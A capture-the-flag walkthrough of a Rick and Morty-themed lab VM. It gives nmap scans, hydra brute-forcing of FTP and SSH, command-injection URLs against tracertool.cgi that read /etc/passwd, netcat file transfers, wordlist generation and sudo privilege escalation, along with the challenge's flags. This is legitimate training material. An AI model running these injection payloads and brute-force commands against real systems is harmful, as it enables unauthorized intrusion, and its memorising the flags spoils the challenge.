[*]
1. Find host, scan it, enumerate ports, and brute-force default passwords
#Used my script genenum (https://github.com/jimmygiv/genenum)
nmap -sn 172.16.16.0/24
1) 172.16.16.1
2) 172.16.16.2
3) 172.16.16.3
4) 172.16.16.39
5) 172.16.16.4

nmap 172.16.16.39
PORT   STATE  PROTOCOL
21     open   ftp
22     open   ssh
80     open   http
9090   open   zeus-admin

hydra -l ftp -e nsr ftp://172.16.16.39
hydra -l anonymous -e nsr ftp://172.16.16.39
hydra -l root -e nsr ssh://172.16.16.39
[21][ftp] host: 172.16.16.39   login: anonymous   password: anonymous
[21][ftp] host: 172.16.16.39   login: anonymous   password: suomynona
[21][ftp] host: 172.16.16.39   login: anonymous
[21][ftp] host: 172.16.16.39   login: ftp   password: ftp
[21][ftp] host: 172.16.16.39   login: ftp
[21][ftp] host: 172.16.16.39   login: ftp   password: ptf

dirb 172.16.16.39
+ http://172.16.16.39/index.html (CODE:200|SIZE:326)
+ http://172.16.16.39/robots.txt (CODE:200|SIZE:126)
[*]
2. The script found default login creds for FTP (and anon login). Found artifacts on robots.txt:
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
[*]
3. Found artifacts on index.html:
**An awesome picture of morty <3**
[*]
4. Found artifact on page /cgi-bin/root_shell.cgi
curl -s http://172.16.16.39/cgi-bin/root_shell.cgi | grep '<!--'
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.-->
[*]
5. Found parameter polution for tracertool.cgi?ip=
http://172.16.16.39/cgi-bin/tracertool.cgi?ip=127.0.0.1;%20whoami
traceroute to 127.0.0.1 (127.0.0.1), 30 hops max, 60 byte packets
 1  localhost (127.0.0.1)  0.089 ms  0.003 ms  0.002 ms
apache
[*]
6. Enumerate webserver http://172.16.16.39/cgi-bin/tracertool.cgi?ip=127.0.0.1; ls -la ../

RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash

total 8
-rwxr-xr-x. 1 root root 255 Aug 22  2017 root_shell.cgi
-rwxr-xr-x. 1 root root 787 Aug 25  2017 tracertool.cgi
-rw-r--r--. 1 root root    326 Aug 22  2017 index.html
-rw-r--r--. 1 root root 539672 Aug 22  2017 morty.png
drwxr-xr-x. 2 root root     44 Aug 23  2017 passwords
-rw-r--r--. 1 root root    126 Aug 22  2017 robots.txt
[*]
7. Checked passwords dir: http://172.16.16.39/passwords/, GOD DAMN! LOL
http://172.16.16.39/passwords/FLAG.txt
FLAG{Yeah d- just don't do it.} - 10 Points
Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty.
Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.
<!--Password: winter-->
[*]
8. Checking FTP server login before getting reverse shell...
ftp 172.16.16.39
**login with ftp/ftp**
ls
get FLAG.txt
exit

FLAG{Whoa this is unexpected} - 10 Points
[*]
9. Look at webserver on port 9090:
FLAG {There is no Zeus, in your face!} - 10 Points
[*]
10. I was struggling to get a shell so I re-scanned the host with the full TCP range.
nmap -T4 -p- 172.16.16.19
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
9090/tcp  open  zeus-admin
13337/tcp open  unknown
22222/tcp open  easyengine
60000/tcp open  unknown
[*]
11. Found artifact on post 13337:
FLAG:{TheyFoundMyBackDoorMorty}-10Points
[*]
12. SSH banner found:
Ncat: Connected to 172.16.16.39:22222.
SSH-2.0-OpenSSH_7.5
get
Protocol mismatch.
[*]
13. Wow lmfao. Found shell on port 60000.
Ncat: Connected to 172.16.16.39:60000.
Welcome to Ricks half baked reverse shell...
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
[*]
14. Get list of users from traceroute shell:
LOL cat just prints ascii art
                     _
                     | \
                     | |
                     | |
|\                   | |
/, ~\                / /
X     `-.....-------./ /
~-. ~  ~              |
\             /    |
\  /_     ___\   /
| /\ ~~~~~   \  |
| | \        || |
| |\ \       || )
(_/ (_/      ((_/
http://172.16.16.39/cgi-bin/tracertool.cgi?ip=127.0.0.1;%20more%20/etc/passwd%20|%20grep%20/home
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
[*]
15. Since i'm lazy, I used hydra to automate password checking with found password "winter"
hydra -L users.txt -p winter -s 22222 ssh://172.16.16.39
hydra -L users.txt -p winter ftp://172.16.16.39
[DATA] attacking ssh://172.16.16.39:22222/
[22222][ssh] host: 172.16.16.39   login: Summer   password: winter
[DATA] attacking ftp://172.16.16.39:21/
[21][ftp] host: 172.16.16.39   login: Summer   password: winter
[*]
16. Login as Summer. Get flag.
[Summer@localhost ~]$ more FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points
[*]
17. Make a real "cat" binary.
**on host machine** nc -nvlp 123 < /usr/bin/cat
**victim** nc -nv 172.16.16.4 123 > cat
chmod 755 cat
alias cat=/home/Summer/cat
[*]
18. Enumerate home directories & user:
sudo -l
may not run sudo
Found potential password file in Morty's folder Safe_Password.jpg
[*]
19. Transfered Safe_Password, and used strings to view contents
root@hostmachine:~/Downloads/genenum# strings picture.jpg
JFIF
Exif
[*]
8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek

unzip journal.zip.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password.
Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
Anyway. Here it is:
FLAG: {131333} - 20 Points

[*]
20. Found NotAFlag.txt
[Summer@localhost ThisDoesntContainAnyFlags]$ cat NotAFlag.txt
hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.
But seriously this isn't a flag..
[*]
21. Trasfered rick's safe binary to my machine with netcat.
[*]
22. Used ltrace to tell what it's doing
ltrace -S ./safe
SYS_access("/etc/ld.so.preload", 04)  #THIS means they are using arguments
ltrace ./safe
puts("Past Rick to present Rick, tell "...Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
)                                                                 = 98
exit(1 <no return ...>
+++ exited (status 1) +++
[*]
23. Used the password in the last flag:
[Summer@localhost ~]$ ./safe 131333
decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.ï¿½	@
[*]
24. Generate password list:
Ricks bands name "Flesh Curtians". Use mp64 (mask processesor) to generate the password list with capital character, number, and then the word.
The list is 1040 characters, so bruteforcing will take 30 minutes max (44 tries per minute)

list=("Flesh flesh Curtains curtains")
for i in ${list[@]}; do mp64 ?u?d$i >> wordlist; done
[*]
25. Brute-force rick's login:
hydra -l RickSanchez -P wordlist -s 22222 ssh://172.16.16.39 -t 4
22222][ssh] host: 172.16.16.39   login: RickSanchez   password: P7Curtains
[*]
26. Login as rick. Get root.
sudo -l
ALL:ALL
sudo su -
more FLAG.txt
[root@localhost ~]# more FLAG.txt
FLAG: {Ionic Defibrillator} - 30 points
[*]
27. Fin!
